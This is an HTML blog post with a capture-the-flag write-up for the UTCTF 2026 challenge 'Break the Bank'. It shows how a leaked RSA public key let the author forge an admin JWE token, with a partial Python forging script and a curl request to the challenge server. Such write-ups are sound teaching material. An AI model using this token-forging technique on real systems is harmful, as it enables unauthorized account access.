@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>UTCTF: Writeup for Web/Break the Bank · Daffa Ilham Ramadan</title>
+    <meta name="description" content="JWE Misconfiguration: Breaking Authentication Through Public Key Leakage" />
+    <link rel="canonical" href="https://daffailhamramadan.com/posts/utctf-break-the-bank.html" />
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+    <link rel="icon" href="/favicon.png" sizes="48x48" />
+    <meta property="og:type" content="article" />
+    <meta property="og:site_name" content="Daffa Ilham Ramadan" />
+    <meta name="twitter:site" content="@FroztNova127" />
+    <meta name="twitter:creator" content="@FroztNova127" />
+    <meta property="og:title" content="UTCTF: Writeup for Web/Break the Bank" />
+    <meta property="og:description" content="JWE Misconfiguration: Breaking Authentication Through Public Key Leakage" />
+    <meta property="og:url" content="https://daffailhamramadan.com/posts/utctf-break-the-bank.html" />
+    <meta property="article:published_time" content="2026-03-15" />
+    <meta name="twitter:card" content="summary" />
+    <link rel="alternate" type="application/atom+xml" title="Daffa Ilham Ramadan" href="/feed.xml" />
+    <link rel="stylesheet" href="/assets/style.css" />
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BlogPosting",
+      "headline": "UTCTF: Writeup for Web/Break the Bank",
+      "url": "https://daffailhamramadan.com/posts/utctf-break-the-bank.html",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://daffailhamramadan.com/posts/utctf-break-the-bank.html"
+      },
+      "datePublished": "2026-03-15",
+      "dateModified": "2026-03-15",
+      "inLanguage": "en",
+      "author": {
+        "@type": "Person",
+        "name": "Daffa Ilham Ramadan",
+        "url": "https://daffailhamramadan.com/",
+        "sameAs": [
+          "https://github.com/daffailhamramadan",
+          "https://www.linkedin.com/in/daffa-ilham-ramadan/",
+          "https://x.com/FroztNova127",
+          "https://hackerone.com/daffailhamramadan",
+          "https://app.intigriti.com/profile/daffailhamramadan127",
+          "https://yeswehack.com/hunters/daffailhamramadan127",
+          "https://bugcrowd.com/h/daffailhamramadan127"
+        ]
+      },
+      "publisher": {
+        "@type": "Person",
+        "name": "Daffa Ilham Ramadan",
+        "url": "https://daffailhamramadan.com/"
+      },
+      "description": "JWE Misconfiguration: Breaking Authentication Through Public Key Leakage",
+      "keywords": "CTF, Web Security, JWE"
+    }
+    </script>
+    <script
+      type="module"
+      src="https://static.cloudflareinsights.com/beacon.min.js"
+      data-cf-beacon='{"token": "29dcc3b4453f45fcbeffe88e05ce15dd"}'
+    ></script>
+  </head>
+  <body>
+    <a class="skip-link" href="#main">Skip to content</a>
+
+    <div class="bg" aria-hidden="true"><canvas></canvas></div>
+
+    <div class="progress" role="presentation"></div>
+
+    <nav class="rail" aria-label="Primary">
+      <div class="rail__inner container">
+        <a class="rail__home" href="/">
+          <span class="rail__full">Daffa Ilham Ramadan</span>
+          <span class="rail__abbr">DIR</span>
+        </a>
+        <div class="rail__nav">
+          <a href="/">Home</a>
+          <a href="/posts/">Posts</a>
+        </div>
+      </div>
+    </nav>
+
+    <main id="main">
+      <article class="post container">
+        <header class="post__header">
+          <p class="eyebrow">Post</p>
+          <h1 class="post__title">UTCTF: Writeup for Web/Break the Bank</h1>
+          <p class="post__dek">JWE Misconfiguration: Breaking Authentication Through Public Key Leakage</p>
+          <p class="post__meta">
+            <time datetime="2026-03-15">15 March 2026</time>
+            <span>3 min read</span>
+            <span>CTF · Web Security · JWE</span>
+          </p>
+        </header>
+
+
+        <details class="toc">
+          <summary>Contents</summary>
+          <ol>
+            <li><a href="#challenge-overview">Challenge Overview</a></li>
+            <li><a href="#tldr">TL;DR</a></li>
+            <li><a href="#step-1-mapping-the-application">Step 1: Mapping the Application</a></li>
+            <li><a href="#step-2-finding-test-credentials">Step 2: Finding Test Credentials</a></li>
+            <li><a href="#step-3-authentication-analysis">Step 3: Authentication Analysis</a></li>
+            <li><a href="#testing-the-admin-area">Testing the Admin Area</a></li>
+            <li><a href="#directory-listing-exposure">Directory Listing Exposure</a></li>
+            <li><a href="#the-fatal-leak-keypem">The Fatal Leak: key.pem</a></li>
+            <li><a href="#crafting-the-forged-jwe-token">Crafting the Forged JWE Token</a></li>
+            <li><a href="#use-the-forged-token">Use the Forged Token</a></li>
+          </ol>
+        </details>
+
+        <div class="post__body">
+          <h2 id="challenge-overview"><span class="num">01</span>Challenge Overview</h2>
+          <ul>
+          <li><strong>CTF</strong>: UTCTF 2026</li>
+          <li><strong>Challenge</strong>: Break the Bank</li>
+          <li><strong>Category</strong>: Web Exploitation</li>
+          <li><strong>Points</strong>: 278</li>
+          <li><strong>Flag</strong>: <code>utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}</code></li>
+          <li><strong>Description</strong>: "Let's just say that this bank isn't exactly following the latest trends in web design (or web security, for that matter). Just take a look at that website!"</li>
+          <li><strong>Author</strong>: Emmett (@emdawg25)</li>
+          </ul>
+          <h2 id="tldr"><span class="num">02</span>TL;DR</h2>
+          <p>The application leaked its JWE public key via a directory listing, allowing attackers to forge admin tokens by encrypting <code>{"sub":"admin"}</code> with the exposed key. The server mistakenly treated successful decryption as proof of authenticity.</p>
+          <h2 id="step-1-mapping-the-application"><span class="num">03</span>Step 1: Mapping the Application</h2>
+          <p>Navigating to the target revealed a retro banking interface with minimal functionality:
+          - Static homepage with branding
+          - Login page at <code>/login.html</code></p>
+          <h2 id="step-2-finding-test-credentials"><span class="num">04</span>Step 2: Finding Test Credentials</h2>
+          <p>Scrolling through the HTML source, I found a link buried in the footer:</p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>html</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>&lt;a href=&quot;/resources/FNSB_InternetBanking_Guide.pdf&quot;&gt;   Access our Internet Banking guide here. &lt;/a&gt;
+</code></pre>
+          </figure>
+          <p>Extracting text from this PDF revealed:</p>
+          <blockquote>
+          <p><strong>Demo Access</strong>: Username: <code>testuser</code> Password: <code>testpass123</code></p>
+          </blockquote>
+          <p>These credentials proved crucial for understanding the authentication flow.</p>
+          <h2 id="step-3-authentication-analysis"><span class="num">05</span>Step 3: Authentication Analysis</h2>
+          <p>Logging in as <code>testuser</code> revealed:</p>
+          <p><strong>Request:</strong></p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>http</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>POST /login HTTP/1.1
+Content-Type: application/json
+
+{&quot;username&quot;:&quot;testuser&quot;,&quot;password&quot;:&quot;testpass123&quot;}
+</code></pre>
+          </figure>
+          <p><strong>Response:</strong></p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>http</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>HTTP/1.1 200 OK
+Set-Cookie: fnsb_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X... [truncated]
+
+{&quot;token&quot;:&quot;eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X...&quot;,&quot;redirect&quot;:&quot;/profile&quot;}
+</code></pre>
+          </figure>
+          <p>The token format immediately suggested JWE (JSON Web Encryption) - a 5-part structure separated by dots:
+          <code>BASE64URL(protected_header).BASE64URL(encrypted_key).BASE64URL(iv).BASE64URL(ciphertext).BASE64URL(tag)</code></p>
+          <p><strong>Token Analysis:</strong></p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>json</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>{
+  &quot;cty&quot;: &quot;JWT&quot;,
+  &quot;enc&quot;: &quot;A256GCM&quot;,
+  &quot;alg&quot;: &quot;RSA-OAEP-256&quot;
+}
+</code></pre>
+          </figure>
+          <p>This is not a standard JWT (which is usually signed). It’s a JWE (JSON Web Encryption) token. JWE is used to encrypt the payload, not to sign it.</p>
+          <ul>
+          <li><strong>alg</strong>: <code>RSA-OAEP-256</code> – the key encryption algorithm. The server encrypts a random Content Encryption Key (CEK) with its RSA public key.</li>
+          <li><strong>enc</strong>: <code>A256GCM</code> – the content encryption algorithm. The payload is encrypted with AES-256-GCM using the CEK.</li>
+          </ul>
+          <p>The crucial point: RSA-OAEP is an asymmetric encryption scheme. Anyone possessing the public key can encrypt data that only the holder of the private key can decrypt.</p>
+          <h2 id="testing-the-admin-area"><span class="num">06</span>Testing the Admin Area</h2>
+          <p>With the session cookie, I tried accessing <code>/admin</code>:</p>
+          <p>The response was:</p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>json</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>{&quot;error&quot;:&quot;Forbidden: admin subject required&quot;}
+</code></pre>
+          </figure>
+          <p>This error tells us two things:
+          1. The server uses the <code>sub</code> (subject) claim from the token to authorize access.
+          2. If we can forge a token with <code>"sub":"admin"</code>, we can bypass the restriction.</p>
+          <h2 id="directory-listing-exposure"><span class="num">07</span>Directory Listing Exposure</h2>
+          <p>While enumerating directories, I discovered that <code>/resources/</code> had directory listing enabled:</p>
+          <p><strong>Index of /resources/</strong>
+          - <code>FNSB_InternetBanking_Guide.pdf</code> (2026-03-14 14:23, 2.4M)
+          - <code>key.pem</code> (2026-03-14 14:23, 1.7K)
+          - <code>memo.txt</code> (2026-03-14 14:23, 0.1K)</p>
+          <h2 id="the-fatal-leak-keypem"><span class="num">08</span>The Fatal Leak: key.pem</h2>
+          <p>Downloading and examining <code>/resources/key.pem</code> revealed:</p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>text</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
+7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
+ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
+cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
+pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
+TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
+OQIDAQAB
+-----END PUBLIC KEY-----
+</code></pre>
+          </figure>
+          <h2 id="crafting-the-forged-jwe-token"><span class="num">09</span>Crafting the Forged JWE Token</h2>
+          <p>Python script to encrypt a malicious payload using the server's own public key:</p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>python</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>from joserfc import jwe
+from joserfc.jwk import RSAKey
+from joserfc.jwe import JWERegistry
+import json
+
+# Load the exposed public key
+# In the CTF, you'd save it as key.pem locally
+# with open(&quot;key.pem&quot;, &quot;rb&quot;) as f:
+#     key = RSAKey.import_key(f.read())
+
+registry = JWERegistry(algorithms=[&quot;RSA-OAEP-256&quot;, &quot;A256GCM&quot;])
+
+# Match the exact header structure of real tokens
+protected = {&quot;cty&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RSA-OAEP-256&quot;, &quot;enc&quot;: &quot;A256GCM&quot;}
+
+# Forge an admin payload
+payload = {&quot;sub&quot;: &quot;admin&quot;}
+plaintext = json.dumps(payload, separators=(',', ':')).encode()
+
+# token = jwe.encrypt_compact(protected, plaintext, key, registry=registry)
+# print(token)
+</code></pre>
+          </figure>
+          <h2 id="use-the-forged-token"><span class="num">10</span>Use the Forged Token</h2>
+          <figure class="code">
+            <div class="code__bar">
+              <span>bash</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>curl -s -H &quot;Cookie: fnsb_token=$TOKEN&quot; http://challenge.utctf.live:5926/admin
+</code></pre>
+          </figure>
+          <p>The response contains the admin console and the flag:</p>
+          <figure class="code">
+            <div class="code__bar">
+              <span>html</span>
+              <button type="button" class="code__copy" hidden>Copy</button>
+            </div>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;FNSB SysAdmin Console&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome, Administrator&lt;/h1&gt;
+    &lt;div class=&quot;flag&quot;&gt;utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}&lt;/div&gt;
+    ...
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+          </figure>
+          <p>Happy Hacking 🏴‍☠️</p>
+        </div>
+
+        <div class="post__end">
+
+          <div class="share">
+            <span class="share__label">Share</span>
+
+            <a
+              class="share__link"
+              href="https://x.com/intent/post?url=https%3A%2F%2Fdaffailhamramadan.com%2Fposts%2Futctf-break-the-bank.html&amp;text=UTCTF%3A%20Writeup%20for%20Web%2FBreak%20the%20Bank"
+              aria-label="Share this post on X"
+              target="_blank"
+              rel="noopener noreferrer"
+            >
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path fill="currentColor" d="M18.24 2.25h3.31l-7.23 8.26 8.5 11.24h-6.66l-5.21-6.82-5.97 6.82H1.67l7.73-8.84L1.25 2.25h6.83l4.71 6.23zm-1.16 17.52h1.83L7.08 4.13H5.12z"/>
+              </svg>
+              <span>X</span>
+            </a>
+
+            <a
+              class="share__link"
+              href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fdaffailhamramadan.com%2Fposts%2Futctf-break-the-bank.html"
+              aria-label="Share this post on LinkedIn"
+              target="_blank"
+              rel="noopener noreferrer"
+            >
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path fill="currentColor" d="M4.98 3.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0M.02 8h4.96v14H.02zm7.98 0h4.76v1.91h.07c.66-1.2 2.28-2.46 4.7-2.46 5.03 0 5.96 3.18 5.96 7.31V22h-4.96v-6.29c0-1.5-.03-3.43-2.09-3.43s-2.41 1.63-2.41 3.32V22H8z"/>
+              </svg>
+              <span>LinkedIn</span>
+            </a>
+
+            <button
+              type="button"
+              class="share__link share__copy"
+              data-url="https://daffailhamramadan.com/posts/utctf-break-the-bank.html"
+              aria-label="Copy a link to this post"
+              hidden
+            >
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true">
+                <path d="M10.4 13.6a4 4 0 0 0 5.66 0l2.83-2.83a4 4 0 1 0-5.66-5.66l-1.3 1.3"/>
+                <path d="M13.6 10.4a4 4 0 0 0-5.66 0L5.1 13.23a4 4 0 1 0 5.66 5.66l1.3-1.3"/>
+              </svg>
+              <span class="share__text">Copy link</span>
+            </button>
+          </div>
+
+          <p><a href="/posts/">&larr; All posts</a></p>
+        </div>
+      </article>
+    </main>
+
+    <footer class="footer container">
+      <span>&copy; <span data-year>2026</span> Daffa Ilham Ramadan</span>
+
+      <ul class="social">
+        <li>
+          <a href="mailto:daffailhamramadan127@gmail.com">
+            <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+              <rect x="2.75" y="5" width="18.5" height="14" rx="2.5" fill="none" stroke="currentColor" stroke-width="1.6"/>
+              <path d="M3.5 6.75 12 12.5l8.5-5.75" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <span class="visually-hidden">Email</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/daffailhamramadan" rel="me">
+            <svg class="icon" viewBox="0 0 16 16" aria-hidden="true">
+              <path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82a7.6 7.6 0 0 1 2-.27c.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8Z"/>
+            </svg>
+            <span class="visually-hidden">GitHub</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://www.linkedin.com/in/daffa-ilham-ramadan/" rel="me">
+            <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="currentColor" d="M4.98 3.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0M.02 8h4.96v14H.02zm7.98 0h4.76v1.91h.07c.66-1.2 2.28-2.46 4.7-2.46 5.03 0 5.96 3.18 5.96 7.31V22h-4.96v-6.29c0-1.5-.03-3.43-2.09-3.43s-2.41 1.63-2.41 3.32V22H8z"/>
+            </svg>
+            <span class="visually-hidden">LinkedIn</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://x.com/FroztNova127" rel="me">
+            <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="currentColor" d="M18.24 2.25h3.31l-7.23 8.26 8.5 11.24h-6.66l-5.21-6.82-5.97 6.82H1.67l7.73-8.84L1.25 2.25h6.83l4.71 6.23zm-1.16 17.52h1.83L7.08 4.13H5.12z"/>
+            </svg>
+            <span class="visually-hidden">X</span>
+          </a>
+        </li>
+      </ul>
+    </footer>
+
+    <script src="/assets/main.js" defer></script>
+  </body>
+</html>
